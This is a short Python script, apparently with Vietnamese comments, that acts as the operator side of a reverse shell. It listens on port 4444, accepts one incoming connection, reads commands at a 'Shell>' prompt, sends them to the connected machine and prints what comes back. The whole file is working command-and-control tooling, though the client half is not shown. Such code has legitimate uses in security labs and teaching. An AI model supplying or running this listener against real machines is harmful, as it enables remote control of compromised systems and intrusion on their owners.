# listener.py
import socket

host = '127.0.0.1'  # hoặc IP cục bộ của bạn
port = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen(1)

print(f"[+] Đang lắng nghe trên {host}:{port}...")
client_socket, client_address = server.accept()
print(f"[+] Kết nối từ: {client_address}")

while True:
    command = input("Shell> ")
    if command.strip().lower() == "exit":
        break
    client_socket.send(command.encode())
    result = client_socket.recv(4096).decode()
    print(result)

client_socket.close()
server.close()
